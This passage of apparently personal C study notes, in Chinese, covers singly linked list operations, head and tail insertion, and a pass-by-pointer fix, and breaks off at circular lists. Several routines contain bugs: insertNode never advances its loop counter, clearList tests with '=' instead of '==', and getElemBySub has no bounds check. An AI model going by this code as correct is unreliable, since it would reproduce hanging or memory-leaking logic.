class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">int</span> sub, ElemType *e)</span>;<br><br>node *<span class="hljs-title function_">getElemPoint</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">char</span> e)</span>;<br><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub, ElemType e)</span>;<br><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList charListHead = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> e;<br>    <span class="hljs-type">int</span> sub;<br>    <span class="hljs-comment">//创建头节点</span><br>    charListHead = (linkList) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    charListHead-&gt;next = <span class="hljs-literal">NULL</span>;<br>    charListHead-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-comment">//初始化链表</span><br>    initList(charListHead);<br><br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s&quot;</span>, isEmpty(charListHead) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    <span class="hljs-comment">//清空链表</span><br>    clearList(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s\n&quot;</span>, isEmpty(charListHead) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    initList(charListHead);<br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, listLength(charListHead));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;e&#x27;</span>));<br><br>    getElemBySub(charListHead, <span class="hljs-number">5</span>, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c&quot;</span>, e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%p&quot;</span>, getElemPoint(charListHead, <span class="hljs-string">&#x27;e&#x27;</span>));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, insertNode(charListHead, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;a&#x27;</span>));<br>    getElemBySub(charListHead, <span class="hljs-number">2</span>, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c&quot;</span>, e);<br><br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, listLength(charListHead));<br>    printfNode(charListHead);<br><br>    sub = <span class="hljs-number">28</span>;<br>    deleteNode(charListHead, sub);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;Z&#x27;</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">//删除</span><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span> &#123;<br>    node *moveNode = headNode;<br>    node* temNode=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;sub&amp;&amp;moveNode-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br>        moveNode=moveNode-&gt;next;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(i&gt;=sub||moveNode==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    temNode=moveNode-&gt;next;<br>    moveNode-&gt;next=moveNode-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(temNode);<br>    <span class="hljs-keyword">return</span> OK;<br><br>&#125;<br><br><span class="hljs-comment">//插入元素</span><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub, ElemType e)</span> &#123;<br>    node *moveNode = headNode;<br>    node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    temNode-&gt;date = e;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &gt;= listLength(headNode)) &#123;<br>        <span class="hljs-built_in">free</span>(temNode);<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> tem = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (tem != sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    temNode-&gt;next = moveNode-&gt;next;<br>    moveNode-&gt;next = temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//取出元素返回地址</span><br>node *<span class="hljs-title function_">getElemPoint</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> ElemType e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span> &amp;&amp; moveNode-&gt;date != e) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> moveNode;<br>&#125;<br><br><br><span class="hljs-comment">//通过下标取出元素</span><br>status <span class="hljs-title function_">getElemBySub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">int</span> sub, ElemType *e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-type">int</span> tem = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (tem != sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>        tem++;<br>    &#125;<br>    *e = moveNode-&gt;date;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//取出元素通过下标</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getElemSub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> ElemType e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-type">int</span> sub = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (moveNode &amp;&amp; moveNode-&gt;date != e) &#123;<br>        moveNode = moveNode-&gt;next;<br>        sub++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (moveNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> sub;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//求链表的长度</span><br>status <span class="hljs-title function_">listLength</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        i++;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i<span class="hljs-number">-1</span>;<br>&#125;<br><br><br><span class="hljs-comment">//清空链表</span><br>status <span class="hljs-title function_">clearList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = <span class="hljs-literal">NULL</span>;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next = <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    headNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//判断是否为空</span><br>status <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//初始化</span><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *nextNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        nextNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        nextNode-&gt;date = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        moveNode-&gt;next = nextNode;<br>        moveNode = nextNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>链表操作的时间和空间复杂度</p><ul><li><p>查找  O(n)</p></li><li><p>插入和删除 O(1)</p><p>理由是，插入和删除都是在一瞬间发生的事，不包括前面的查找</p><p>所以在查找的时间复杂度为 O(n);</p></li></ul></li><li><p>链表初始化的方式</p><ul><li><p>头插法</p><p>意思是每次都是从头节点后面一位插入数据</p><p>这个是反循序的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node* temNode=(node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        <span class="hljs-keyword">if</span>(temNode==<span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">return</span> ERROR;<br>        &#125;<br>        temNode-&gt;date=<span class="hljs-string">&#x27;a&#x27;</span>+i;<br>        temNode-&gt;next=headNode-&gt;next;<br>        headNode-&gt;next=temNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>尾插法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//初始化</span><br>status <span class="hljs-title function_">initList2</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *nextNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        nextNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        nextNode-&gt;date = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        moveNode-&gt;next = nextNode;<br>        moveNode = nextNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>问题代码</p><ul><li>为什么将头节点放进函数<code>malloc</code>,在main函数中，头节点却是空？</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode = <span class="hljs-literal">NULL</span>;<br>    initList(headNode);<br>    printfNode(headNode);<br>    destroyList(headNode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    headNode = (linkList) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    headNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    headNode-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;date = <span class="hljs-string">&#x27;a&#x27;</span> + i;<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        moveNode-&gt;next = temNode;<br>        moveNode = temNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>原因：</p><p>C语言的传参本质上都是传值，也就是拷贝传参，普通变量拷贝的普通的值，指针变量拷贝的是指针</p><p>具体参考：<a href="%5B(21%E6%9D%A1%E6%B6%88%E6%81%AF">深入理解C语言函数传参方式</a> 深入理解C语言函数传参方式_c 为什么是一个一个传参的_amcomputer的博客-CSDN博客](<a href="https://blog.csdn.net/qq_39463175/article/details/115566613">https://blog.csdn.net/qq_39463175/article/details/115566613</a>))</p><p>所以修改后的代码是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode = <span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode);<br>    printfNode(headNode);<br>    destroyList(headNode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList* headNode)</span> &#123;<br>    (*headNode)=(linkList)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span>((*headNode)==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    (*headNode)-&gt;next=<span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;date=<span class="hljs-string">&#x27;0&#x27;</span>;<br>    node* moveNode=(*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node* temNode=(node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;next=<span class="hljs-literal">NULL</span>;<br>        temNode-&gt;date=<span class="hljs-string">&#x27;A&#x27;</span>+i;<br>        moveNode-&gt;next=temNode;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        num++;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    headNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h3><ol><li><p>最后一个节点指向首节点</p></li><li><p>因为没有最后一个节点为空，所以我们在遍历的时候，我们需要判断等不等于头节点</p></li><li><p>使用尾指针更加的方便（更快的操作末节点，头节点和<code>a1</code>）</p></li><li><p>简单的代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span 